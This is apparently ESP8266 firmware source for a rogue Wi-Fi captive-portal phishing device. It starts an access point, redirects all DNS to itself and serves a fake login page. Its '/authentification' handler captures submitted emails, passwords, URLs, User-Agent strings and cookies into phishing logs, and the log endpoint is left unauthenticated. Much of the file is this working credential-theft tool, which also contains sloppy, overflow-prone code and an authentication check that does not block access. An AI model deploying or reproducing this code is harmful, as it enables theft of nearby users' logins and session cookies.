#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>
#include <ESP8266httpUpdate.h>
#include <ESP8266HTTPUpdateServer.h>
#include <ESP8266mDNS.h>
#include <FS.h>
//#include <ESP8266FtpServer.h> // https://github.com/exploitagency/esp8266FTPServer/tree/feature/bbx10_speedup
#include <DNSServer.h>

// DEFINING FILE TYPES
const byte DNS_PORT = 53;
const char W_PORTAL[] PROGMEM = "esp.portal"; // captive portal domain (alternative to 192.168.4.1)
const char W_HTML[] PROGMEM = "text/html";
const char W_CSS[] PROGMEM = "text/css";
const char W_JS[] PROGMEM = "application/javascript";
const char W_PNG[] PROGMEM = "image/png";
const char W_GIF[] PROGMEM = "image/gif";
const char W_JPG[] PROGMEM = "image/jpeg";
const char W_ICON[] PROGMEM = "image/x-icon";
const char W_XML[] PROGMEM = "text/xml";
const char W_XPDF[] PROGMEM = "application/x-pdf";
const char W_XZIP[] PROGMEM = "application/x-zip";
const char W_GZIP[] PROGMEM = "application/x-gzip";
const char W_JSON[] PROGMEM = "application/json";
const char W_TXT[] PROGMEM = "text/plain";

const char W_DOT_HTM[] PROGMEM = ".htm";
const char W_DOT_HTML[] PROGMEM = ".html";
const char W_DOT_CSS[] PROGMEM = ".css";
const char W_DOT_JS[] PROGMEM = ".js";
const char W_DOT_PNG[] PROGMEM = ".png";
const char W_DOT_GIF[] PROGMEM = ".gif";
const char W_DOT_JPG[] PROGMEM = ".jpg";
const char W_DOT_ICON[] PROGMEM = ".ico";
const char W_DOT_XML[] PROGMEM = ".xml";
const char W_DOT_PDF[] PROGMEM = ".pdf";
const char W_DOT_ZIP[] PROGMEM = ".zip";
const char W_DOT_GZIP[] PROGMEM = ".gz";
const char W_DOT_JSON[] PROGMEM = ".json";


String W_WEBINTERFACE = "/web";  // default folder containing the web files

String update_path = "/update";

ESP8266WebServer server(80);
ESP8266WebServer httpServer(1337);
ESP8266HTTPUpdateServer httpUpdater;
//FtpServer ftpSrv;
DNSServer dnsServer;
HTTPClient http;

void requireAuthentication(){
  if(!server.authenticate(update_username, update_password))
    return server.requestAuthentication();
}

void sendProgmem(const char* ptr, size_t size, const char* type) {
    server.sendHeader("Content-Encoding", "gzip");
    server.sendHeader("Cache-Control", "max-age=86400");
    server.send_P(200, str(type).c_str(), ptr, size);
}

void returnFail(String msg)
{
  logging("returnFail :: error 500 hit");
  server.sendHeader("Connection", "close");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(500, "text/plain", msg + "\r\n");
}

void handleSubmitSettings()
{
  String SETTINGSvalue;

  if (!server.hasArg("SETTINGS")) return returnFail("BAD ARGS");

  SETTINGSvalue = server.arg("SETTINGS");
  whiteHat = server.arg("whiteHat").toInt();
  Serial.println(whiteHat);
  server.arg("ssid").toCharArray(ssid, 32);
  server.arg("password").toCharArray(password, 64);
  channel = server.arg("channel").toInt();
  hidden = server.arg("hidden").toInt();
  server.arg("local_IPstr").toCharArray(local_IPstr, 16);
  // // ADD MAC ADRESS OPTION
  server.arg("gatewaystr").toCharArray(gatewaystr, 16);
  server.arg("subnetstr").toCharArray(subnetstr, 16);
  server.arg("update_username").toCharArray(update_username, 32);
  server.arg("update_password").toCharArray(update_password, 64);
  server.arg("ftp_username").toCharArray(ftp_username, 32);
  server.arg("ftp_password").toCharArray(ftp_password, 64);
  ftpenabled = server.arg("ftpenabled").toInt();
  esportalenabled = server.arg("esportalenabled").toInt();

  if (SETTINGSvalue == "1") {
    logging("handleSubmitSettings :: New setting uploaded");
    saveSettingsJSON();
    loadSettingJSON();
    ESP.restart();
  }

  else {
    returnFail("Bad SETTINGS value");
  }
}


void client_status() {

  unsigned char number_client;
  struct station_info *stat_info;

  struct ip4_addr *IPaddress;
  IPAddress address;
  int i=1;
  number_client= wifi_softap_get_station_num();
  stat_info = wifi_softap_get_station_info();
  if (number_client>0){
    stationConnected = 1;
  } else {
    stationConnected = 0;
  }
  while (stat_info != NULL) {
    StaticJsonBuffer<500> jsonBuffer;
    JsonObject& json = jsonBuffer.createObject();


    IPaddress = &stat_info->ip;
    address = IPaddress->addr;

    char stationIP[50]="";
    sprintf(stationIP, "%d.%d.%d.%d", address[0], address[1], address[2], address[3]);

    char stationMac[32]="";
    sprintf(stationMac, "%02X:%02X:%02X:%02X:%02X:%02X", stat_info->bssid[0], stat_info->bssid[1], stat_info->bssid[2], stat_info->bssid[3], stat_info->bssid[4], stat_info->bssid[5]);

    stationID = 0;
    for (int j = 0; j < 6; j++) {
      stationID = stationID + stat_info->bssid[j];
    }

    json["id"] = stationID;
    json["ip"] = stationIP;
    json["mac"] = stationMac;

    // vendor = macoui(stationMAC);

    json["phished"] = "NO";
    char filename[50];
    sprintf(filename, "/stations/%d.json", stationID); // THIS LINE PAUSES PROBLEM AS STATIONID IS AN INT AND IT SEAMS IT POSES AN ISSUE WITH SPRINTF

    File jsonStation = SPIFFS.open(filename, "w");
    json.printTo(jsonStation);
    jsonStation.close();

    sprintf(filename, "/connected/%d.json", stationID); // THIS LINE PAUSES PROBLEM AS STATIONID IS AN INT AND IT SEAMS IT POSES AN ISSUE WITH SPRINTF
    File jsonConnect = SPIFFS.open(filename, "w");
    json.printTo(jsonConnect);
    jsonConnect.close();


    stat_info = STAILQ_NEXT(stat_info, next);
    i++;
  }

}

bool handleFileRead(const char* path, const char* type){  // send the right file to the client (if it exists)
  String contentType = str(type).c_str();             // Get the MIME type
  if(SPIFFS.exists(path) ){  // If the file exists, either as a compressed archive, or normal
    File file = SPIFFS.open(path, "r");                    // Open the file
    size_t sent = server.streamFile(file, contentType);    // Send it to the client
    file.close();                                          // Close the file again
    return true;
  }
  char fileinquestion[50];
  sprintf(fileinquestion, "handleFileRead :: File not found %s", path);
  logging(fileinquestion);
  return false;                                          // If the file doesn't exist, return false
}

void startAP() {
    logging("startAP :: Starting Access Point");
    WiFi.disconnect(true);
    WiFi.mode(WIFI_AP);
    IPAddress local_IP;
    local_IP.fromString(local_IPstr);
    IPAddress gateway;
    gateway.fromString(gatewaystr);
    IPAddress subnet;
    subnet.fromString(subnetstr);
    byte mac[6];
    WiFi.macAddress(mac);
    sprintf(local_MAC, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    if(!WiFi.softAP(ssid, password, channel, hidden)){
      char softapsmsg[50];
      sprintf(softapsmsg, "startAP :: Error statong softAP : ssid %s, password %s, channel %s, hidden %s", ssid, password, channel, hidden);
      logging("Restarting ESP");

      ESP.restart();
    }
    if(!WiFi.softAPConfig(local_IP, gateway, subnet) ){
      char softapconfigsmsg[50];
      sprintf(softapconfigsmsg, "startAP :: Error statong softAPConfig : local_IP %s, gateway %s, subnet %s",  local_IPstr, gatewaystr, subnetstr);
      logging(softapconfigsmsg);
      logging("Restarting ESP");

      ESP.restart();
    }

    MDNS.begin("www.captive.fr");
    httpUpdater.setup(&httpServer, update_path, update_username, update_password);
    httpServer.begin();

    MDNS.addService("http", "tcp", 1337);
    dnsServer.start(DNS_PORT, "*", local_IP);
   // if (ftpenabled==1){
   //   ftpSrv.begin(String(ftp_username),String(ftp_password));
   // }

    // aggressively caching static assets
    // server.serveStatic("/js", SPIFFS, String("web/js").c_str(), "max-age=86400");
    // server.serveStatic("/css", SPIFFS, String("web/").c_str(), "max-age=86400");

    // server.onNotFound([]() {
    //     sendProgmem(responseHTML, sizeof(responseHTML), W_HTML);
    // });


    // PORTAL WEBPAGES
    server.on(String(F("/espportal")).c_str(), HTTP_GET, [](){

      requireAuthentication();
      client_status();
      sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
    });

    server.on(String(F("/settings")).c_str(), HTTP_GET, [](){
      requireAuthentication();
      sendProgmem(settingshtml, sizeof(settingshtml), W_HTML);
    });

    server.on(String(F("/settings")).c_str(), HTTP_POST, [](){
      requireAuthentication();
      handleSubmitSettings();
    });

    server.on(String(F("/systemlogs")).c_str(), HTTP_GET, [](){
      requireAuthentication();
      sendProgmem(systemlogshtml, sizeof(systemlogshtml), W_HTML);
    });

    server.on(String(F("/log")).c_str(), HTTP_GET, [](){
      requireAuthentication();
      handleFileRead("/log", W_TXT);
    });

    server.on(String(F("/download_system_logs")).c_str(), HTTP_GET, [](){
      requireAuthentication();
      handleFileRead("/log", W_TXT);
    });

    server.on(String(F("/wipe_system_logs")).c_str(), HTTP_GET, [](){
      requireAuthentication();
      wipeLog("/log", "");
      sendProgmem(systemlogshtml, sizeof(systemlogshtml), W_HTML);
    });

    server.on(String(F("/viewlogs")).c_str(), HTTP_GET, [](){
      requireAuthentication();
      sendProgmem(viewlogshtml, sizeof(viewlogshtml), W_HTML);
    });

    server.on(String(F("/phishinglogs")).c_str(), HTTP_GET, [](){
      // requireAuthentication();
      handleFileRead("/phishinglogs", W_TXT);
    });

    server.on(String(F("/download_phish_logs")).c_str(), HTTP_GET, [](){
      requireAuthentication();
      handleFileRead("/phishinglogs", W_TXT);
    });

    server.on(String(F("/wipe_physh_logs")).c_str(), HTTP_GET, [](){
      requireAuthentication();
      wipeLog("/phishinglogs", "[]");
      sendProgmem(viewlogshtml, sizeof(viewlogshtml), W_HTML);
    });

    server.on(String(F("/json/settings.json")).c_str(), HTTP_GET, [](){
      requireAuthentication();
      handleFileRead("/json/settings.json", W_JSON);
    });

    server.on(String(F("/json/system.json")).c_str(), HTTP_GET, [](){
      requireAuthentication();
      handleFileRead("/json/system.json", W_JSON);
    });

    server.on(String(F("/error")).c_str(), HTTP_GET, [](){
      requireAuthentication();
      sendProgmem(systemlogshtml, sizeof(systemlogshtml), W_HTML);
    });

    server.on(String(F("/json")).c_str(), HTTP_GET, [](){
      requireAuthentication();
      char station[32];
      server.arg("station").toCharArray(station, 32);
      char filename[60];
      sprintf(filename, "/connected/%s", station);
      handleFileRead(filename, W_JSON);
    });

    server.on(String(F("/firmware")).c_str(), HTTP_GET, [](){
      requireAuthentication();
      sendProgmem(firmwarehtml, sizeof(firmwarehtml), W_HTML);
    });

    server.on(String(F("/format")).c_str(), HTTP_GET, [](){
      requireAuthentication();
      SPIFFS.format();
      ESP.restart();
    });

    server.on(String(F("/reboot")).c_str(), HTTP_GET, [](){
      requireAuthentication();
      ESP.restart();
    });

    server.on(String(F("/reset_settings")).c_str(), HTTP_GET, [](){
      requireAuthentication();
      createDefaultsSettingsJSON();
      ESP.restart();
    });

    server.on(String(F("/normalize.min.css")).c_str(), HTTP_GET, [](){
      sendProgmem(normalizemincss, sizeof(normalizemincss), W_CSS);
    });

    server.on(String(F("/main.css")).c_str(), HTTP_GET, [](){
      sendProgmem(maincss, sizeof(maincss), W_CSS);
    });

    server.on(String(F("/milligram.min.css")).c_str(), HTTP_GET, [](){
      sendProgmem(milligrammincss, sizeof(milligrammincss), W_CSS);
    });

    server.on(String(F("/jquery.slim.min.js")).c_str(), HTTP_GET, [](){
      sendProgmem(jqueryslimminjs, sizeof(jqueryslimminjs), W_JS);
    });

    server.on(String(F("/main.js")).c_str(), HTTP_GET, [](){
      sendProgmem(mainjs, sizeof(mainjs), W_JS);
    });

    server.onNotFound([]() {
      client_status();
      if (esportalenabled) {
      sendProgmem(captivehtml, sizeof(captivehtml), W_HTML);
    } else {
      requireAuthentication();
      sendProgmem(indexhtml, sizeof(indexhtml), W_HTML);
    }
    });

    server.on(String(F("/captive.css")).c_str(), HTTP_GET, [](){
      sendProgmem(captivecss, sizeof(captivecss), W_CSS);

    });

    server.on(String(F("/shutdown")).c_str(), HTTP_GET, [](){
      if(stationPhished){
        logging("-------Setting Attack Json-------");
        createAttackSettingsJSON();
        WiFi.disconnect(true);
        delay(1000);
        ESP.restart();

      }
    });


    server.on(String(F("/authentification")).c_str(), HTTP_POST, [](){
      String url = server.arg("url");
      String user = server.arg("email");
      String pass = server.arg("password");
      String userAgent;
      String cookie;

      if (server.hasHeader("User-Agent")){
        userAgent = server.header("User-Agent");
      } else{
        userAgent = "Unknown";
      }
      if (server.hasHeader("Cookie")){
        cookie = server.header("Cookie");
        Serial.println(cookie);
      } else{
        Serial.println("NO COOKIES");
        cookie = "no cookies";
      }

      phishCreds(url, user, pass, userAgent);
      if(whiteHat){

        sendProgmem(redirect_whitehathtml, sizeof(redirect_whitehathtml), W_HTML);
      }else{
        sendProgmem(captive500html, sizeof(captive500html), W_HTML);


      }
    });

    server.on(String(F("/whitehat")).c_str(), HTTP_GET, [](){
      sendProgmem(whitehathtml, sizeof(whitehathtml), W_HTML);

    });



    const char * headerkeys[] = {"User-Agent", "Cookie", "Authorization"} ;
    size_t headerkeyssize = sizeof(headerkeys) / sizeof(char*);
    //ask server to track these headers
    server.collectHeaders(headerkeys, headerkeyssize);

    server.begin();
    WiFiClient client;
    client.setNoDelay(1);

}
